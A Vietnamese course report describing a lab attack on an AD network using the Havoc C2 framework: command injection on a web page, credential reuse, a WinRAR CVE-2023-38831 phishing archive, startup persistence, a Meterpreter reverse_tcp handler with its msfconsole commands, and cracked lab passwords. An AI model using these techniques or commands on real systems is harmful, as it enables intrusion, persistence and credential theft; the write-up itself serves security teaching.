# **Báo cáo đồ án**
# **Môn: tấn công mạng**
## **1. Thông tin về đồ án**
Xây dựng mô hình và kịch bản tấn công hệ thống mạng sử dụng mô hình C2 Havoc. Mô tả các kỹ thuật tấn công theo MITRE ATT@CK.
- Xây dựng được mô hình chung cho hệ thống và xây dựng hoàn chỉnh các thành phần trong mạng. (AD, Web, Client,...).
- Xây dựng được mô hình cho C2, phân tích cụ thể các thành phần sử dụng trong C2.
- Xây dựng tối thiểu 2 kịch bản tấn công, bao gồm nhiều giao thức (tự chọn) để tấn công vào mô hình mạng, ví dụ kịch bản:
  
  - Tấn công lỗ hổng trên web server sau đó tìm cách lấy list user trên máy chủ AD.
  
  - Lây lan qua các máy trong mạng để thu thập càng nhiều dữ liệu về user càng tốt.
  
Hệ thống lab sau đây được tham khảo từ tác giả Ashifcoder build bằng vagrant, với một số chỉnh sửa cho phù hợp với yêu cầu đề bài.   

## **2. Phân tích quá trình tấn công**
### **2.1. Kịch bản tấn công:**
AD: `nonocorp.local`

Web: `nonocorp.timoxoszt.me`

Hệ thống mạng nội bộ gồm 4 máy:
-	`RootDC (Active Directory)`: Windows Server 2019
-	`User1 (WS1)`: Windows 10
-	`User2 (WS2)`: Windows 10
-	`Web (Web01)`: Ubuntu, đóng vai trò là WebServer giao tiếp với External Network.

Máy Attacker sử dụng `Kali Linux` dùng để xâm nhập vào hệ thống mạng nội bộ nói trên.

![*Hình 1. Luồng thực thi tấn công vào hệ thống.*](/Images/Picture1.png)

Giới thiệu về Havoc Framework: một framework mã nguồn mở cho phép cài đặt và vận hành C2 server một cách dễ dàng, tích hợp nhiều tính năng giúp cho việc quản lí, duy trì trong hệ thống mạng đã khai thác, được sử dụng như một giải pháp thay thế cho Cobalt Strike và Brute Ratel (post-exploitation C2 framework). C2 framework cung cấp cho các threat actor khả năng thả beacon trên các mạng bị xâm chiếm để vận chuyển các payload độc hại. Trong những năm qua, Cobalt Strike và Brute Ratel đã trở thành công cụ phổ biến để các threat actor cung cấp payload độc hại cho những nạn nhân được nhắm tới. Điều này đã khiến các nhà phát triển và tổ chức C2 sử dụng Cobalt Strike và Brute Ratel phải cảnh giác hơn với phần mềm độc hại tiềm ẩn bên trong repository của họ. Với Havoc, các threat actor được cung cấp một con đường mới để nhắm mục tiêu và khai thác mạng.

Về hệ thống C2 Server, gồm 3 thành phần chính:
- Havoc Server: Máy chủ cốt lõi của framework, dùng để khởi động listener, tương tác với các agent và xử lí các command do client yêu cầu.
- Havoc Client: Giao diện chính của framework, giúp cho các thành viên redteam liên lạc, tương tác với các máy bị xâm chiếm.
- Havoc Agent: payload được khởi chạy bởi máy tính mục tiêu, nhận lệnh và thực thi lệnh do server yêu cầu.
 
Hình 2. Hệ thống C2 Server.
Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận: exploit từ Web01 đi vào, tải và thực thi file agent, sau đó gửi malware phishing cho WS01, từ đó máy WS01 này sẽ tải agent và thực thi để thêm vào C2 Server, duy trì sự hiện diện trong hệ thống.
### **2.2. Phân tích cụ thể**
#### **2.2.1. Reconnaissance (TA0043).**
Truy cập vào trang web nonocorp.timoxoszt.me, ta thấy trang web này có chức năng hiển thị thông số của máy ubuntu và không còn gì khác.
 
Hình 3. Nội dung trang web.
Tiến hành scandir để tìm xem có directory ẩn nào hay không. Sau khi chạy xong, ta tìm được một vài directory ẩn: /robots.txt, /dev.php.
 
Hình 4. Sử dụng Gobuster và file seclist mới nhất.
 
Hình 5. Nội dung /robots.txt
 
Hình 6. Nội dung /dev.php
Một trang web sử dụng lệnh ping để kiểm tra trạng thái của trang web. Sau một vài thử nghiệm, ta phát hiện trang web này dính lỗ hổng RCE, có thể thực thi mã từ xa và trả về kết quả.
  
Hình 7. Kết quả trả về khi nhập vào 8.8.8.8

 
Hình 8. IP máy web.
Sử dụng lệnh cat đọc file deploy.sh, phát hiện một credential có ở trong file cùng với ip của máy. Để có thể chắc chắn máy ssh được, kiểm tra port đang mở bằng lệnh netstat.
 
Hình 9. Nội dung file deploy.sh

 
Hình 10. Port 22 được mở.
#### **2.2.2. Initial Access (TA0001)**
Ta đã thu thập tất cả thông tin, tiến hành ssh vào máy web.
 
Hình 11. ssh vào máy web.
 
Hình 12. Pwn được máy Web01.
=> ssh thành công, bước đầu chiếm được máy web.
Để xác định được hệ thống gồm bao nhiêu máy, ta sẽ tiến hành scan mạng nội bộ. Nhưng do vấn đề phát hiện và ghi log của máy, không sử dụng nmap mà ta sẽ tạo một file bash script và ping mạng 10.10.10.0/24.
 
Hình 13. Bash script ping ip từ 10.10.10.1 đến 10.10.10.255
Ta tìm được 3 ip sau: 10.10.10.3, 10.10.10.101 và 10.10.10.102 => hệ thống gồm 4 máy bao gồm web.
Trong quá trình reconnaissance máy web, tìm thấy một file backup.sh chứa credential của ip 10.10.10.102 ở đường dẫn /var/www. Khi ssh sử dụng credential đó, thành công chiếm máy 10.10.10.102.
 
Hình 14. Nội dung file backup.sh
 
Hình 15. ssh thành công vào máy 10.10.10.102.
 
Hình 16. Pwn thành công máy WS02
#### **2.2.3. Lateral Movement (TA0008)**
Tiếp theo ta sẽ sử dụng Havoc Framework để cắm agent vào máy darlene dễ dàng truy cập và duy trì sự hiện diện.
 
Hình 17. Giao diện Havoc TeamClient.
Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy darlene bằng cách host một server có domain ms-updates.online chứa file này, sau đó kích hoạt để HavocClient hiển thị các thông tin của máy này, bao gồm cả shell, thư mục, đường dẫn, ...
 
Hình 18. Khởi tạo agent Demon.
 
Hình 19. Tiến hành tải agent từ server.

 
Hình 20. HavocClient sau khi chạy file agent ở máy darlene.
Vậy là ta đã thành công cắm C2 Server vào máy darlene. Ta cần phải thêm file teams.exe này vào startup của máy để khi máy được khởi động, HavocCilent sẽ tự động kết nối. Chúng ta sẽ cd vào đường dẫn sau và tải file agent về, khi đó mục startup của máy sẽ có tiến trình agent này, khi máy khởi động thì tiến trình này sẽ tự động kích hoạt. Path: C:\Users\darlene\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
Vì không tìm thấy bất cứ thông tin gì trên máy darlene này, ta sẽ tiến hành sử dụng kĩ thuật phishing, gửi malware cho user tryell, một nhân viên trực ở hệ thống. 
Để có thể phishing thì ta cần chuẩn bị một file malware. Ở đây chúng tôi sẽ sử dụng lỗi của winrar cho phép kẻ tấn công thực thi mã từ xa, với định danh CVE-2023-38831. Sử dụng tool tạo malware winrar được lấy từ github: https://github.com/b1tg/CVE-2023-38831-winrar-exploit. Khởi tạo xong file và đặt tên là KeHoachThuongTet, ta tiến hành gửi file rar này cho user tryell thông qua mail.
 
Hình 21. Khởi tạo payload.
 
Hình 22. Script mã độc khi user bấm vào file pdf có trong file rar.
Giả sử user tryell đã tải về. Khi user này mở ra và bấm vào file pdf, script sẽ được chạy, cd vào đường dẫn chứa thư mục startup, tải file agent có tên teams.exe về máy và tự khởi chạy.
 
Hình 23. Quá trình thực thi mã độc.
 
Hình 24. HavocClient đã nhận được kết nối từ tryell.
Kiểm tra ip của máy, ta biết được ip là 10.10.10.101. Vậy máy còn lại có ip 10.10.10.3 chính là AD.
 
Hình 25. Ipconfig máy tryell.
 
Hình 26. Pwn thành công máy WS02. 
#### **2.2.4. Command and Control (TA0011) và Exfiltration (TA0010)**
Dựa vào shell của HavocClient, ta có thể thực thi và vận chuyển payload, tools,... sang máy một cách dễ dàng.
Việc đầu tiên cần làm là kiểm tra 2 máy có mở port 3389 hay không. Và sau khi sử dụng lệnh shell netstat -aon, kết quả là máy tryell có mở và darlene thì không.
 
Hình 27. Máy tryell có mở port 3389.

 
Hình 28. Máy darlene không mở port 3389.
Tiếp theo dump credentials của máy tryell, mục đích của việc này là để kiếm xem có các file password mà các user này để ở đâu đó trong máy không. Tại bước này, ta sẽ sử dụng Metasploit để tạo payload có tên là ms-teams.exe và lấy được Meterpreter của máy tryell.
 
Hình 29. Tạo payload sử dụng msfvenom.
Tiếp theo chạy msfconsole để tạo listener.
Msf6> use exploit/multi/handler
Msf6> set payload windows/meterpreter/reverse_tcp
Msf6> set LHOST 192.168.87.129
Msf6> set LPORT 1234
Msf6> exploit
Sau đó, vận chuyển payload ms-teams.exe vừa tạo thông qua shell của HavocClient.
 
Hình 30. Upload payload thành công.
 
Hình 31. Thực thi lệnh shell để agent chạy file ms-teams.exe, meterpreter xuất hiện.
 
Hình 32. Hashdump và kết quả trả về là các user cùng với các hash password.
Sử dụng công cụ hash decryptor online, ta tìm được các account như sau:
darlene:WinClient321
dxl:P@ssword
tryell:WinClient123
vagrant:vagrant
Chúng ta sẽ sử dụng các account này để rdp vào máy tryell. Sau khi tìm kiếm trong máy, ta phát hiện file trong account vagrant.
 
Hình 33. RDP vào máy tryell.
Và máy AD có các thông tin sau:
- IP: 10.10.10.3
- Username: nonocorp\mrrobot
- Password: P@ssword
Ta thử sử dụng credential này bằng rdp.
 
Hình 34. Đăng nhập thành công.
 
		Hình 35. Pwn thành công máy root.
## **3. Tổng kết**
Bảng MITRE ATT&CK:
Tên kĩ thuật	ID	Phương thức
Reconnaissance	T1595.003	Active Scanning – Wordlist Scanning
Initial Access	T1659	Content Injection
	T1078	Valid Account
Lateral Movement	T1021.001	Remote Service – Remote Desktop Protocol
	T1534	Internal Spearphishing
	T1570	Lateral Tools Transfer
Command and Control	T1659	Content Injection
Exfiltration	T1041	Exfiltration Over C2 Channel

Tài liệu tham khảo:
[1] https://github.com/Ashifcoder/exposelab
[2] https://attack.mitre.org/matrices/enterprise/
[3] https://github.com/HavocFramework/Havoc
[4] https://blog.viettelcybersecurity.com/canh-bao-chien-dich-tan-cong-cua-nhom-apt-darkpink-nham-den-vao-nuoc-dong-nam-a/
